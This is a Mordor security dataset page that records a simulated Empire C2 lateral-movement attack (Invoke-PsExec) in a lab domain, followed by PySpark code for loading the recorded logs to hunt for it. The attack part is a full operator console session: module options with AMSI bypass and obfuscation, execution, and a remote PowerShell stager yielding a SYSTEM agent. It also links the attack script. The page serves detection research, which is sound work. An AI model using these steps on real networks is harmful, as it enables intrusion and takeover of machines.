# Empire Invoke PsExec

## Metadata


|                   |    |
|:------------------|:---|
| id                | SDWIN-190518210652 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/05/18 |
| platform          | Windows |
| Mordor Environment| Mordor shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_movement/Invoke-PsExec.ps1 |
| Dataset           | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/empire_invoke_psexec.zip |
| References        | None |

## Dataset Description
This dataset represents adversaries executing malicious code remotely psexec style

## Adversary View
```
(Empire: F82SZKVW) > usemodule lateral_movement/invoke_psexec
(Empire: powershell/lateral_movement/invoke_psexec) > info

              Name: Invoke-PsExec
            Module: powershell/lateral_movement/invoke_psexec
        NeedsAdmin: False
        OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: True
  OutputExtension: None

Authors:
  @harmj0y

Description:
  Executes a stager on remote hosts using PsExec type
  functionality.

Comments:
  https://github.com/rapid7/metasploit-
  framework/blob/master/tools/psexec.rb

Options:

  Name             Required    Value                     Description
  ----             --------    -------                   -----------
  Agent            True        F82SZKVW                  Agent to run module on.                 
  Listener         False       http                      Listener to use.                        
  Obfuscate        False       False                     Switch. Obfuscate the launcher          
                                                        powershell code, uses the               
                                                        ObfuscateCommand for obfuscation types. 
                                                        For powershell only.                    
  ObfuscateCommand False       Token\All\1               The Invoke-Obfuscation command to use.  
                                                        Only used if Obfuscate switch is True.  
                                                        For powershell only.                    
  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in 
                                                        the stager code.                        
  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   
                                                        the stager code.                        
  ComputerName     True        WORKSTATION6.theshire.lo  Host[s] to execute the stager on, comma 
                              cal                       separated.                              
  ServiceName      True        Updater                   The name of the service to create.      
  Command          False                                 Custom command to execute on remote     
                                                        hosts.                                  
  ResultFile       False                                 Name of the file to write the results to
                                                        on agent machine.                       
  UserAgent        False       default                   User-agent string to use for the staging
                                                        request (default, none, or other).      
  Proxy            False       default                   Proxy to use for request (default, none,
                                                        or other).                              
  ProxyCreds       False       default                   Proxy credentials                       
                                                        ([domain\]username:password) to use for 
                                                        request (default, none, or other).      

(Empire: powershell/lateral_movement/invoke_psexec) > execute
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked F82SZKVW to run TASK_CMD_JOB
[*] Agent F82SZKVW tasked with task ID 3
[*] Tasked agent F82SZKVW to run module powershell/lateral_movement/invoke_psexec
(Empire: powershell/lateral_movement/invoke_psexec) > 
Job started: KB5D9Y

[*] Sending POWERSHELL stager (stage 1) to 172.18.39.6
[*] New agent KL51GERT checked in
[+] Initial agent KL51GERT from 172.18.39.6 now active (Slack)
[*] Sending agent (stage 2) to KL51GERT at 172.18.39.6

(Empire: powershell/lateral_movement/invoke_psexec) > agents

[*] Active agents:

Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
62HY9XCK ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       powershell         3172   5/0.0    2020-08-07 14:30:45  http            
F82SZKVW ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         6008   5/0.0    2020-08-07 19:12:34  http            
Y9RCLV64 ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       notepad            2576   5/0.0    2020-08-07 19:03:46  http            

KL51GERT ps 172.18.39.6     WORKSTATION6      *THESHIRE\SYSTEM        powershell         7516   5/0.0    2020-08-07 19:12:32  http            

(Empire: agents) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/empire_invoke_psexec.zip"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        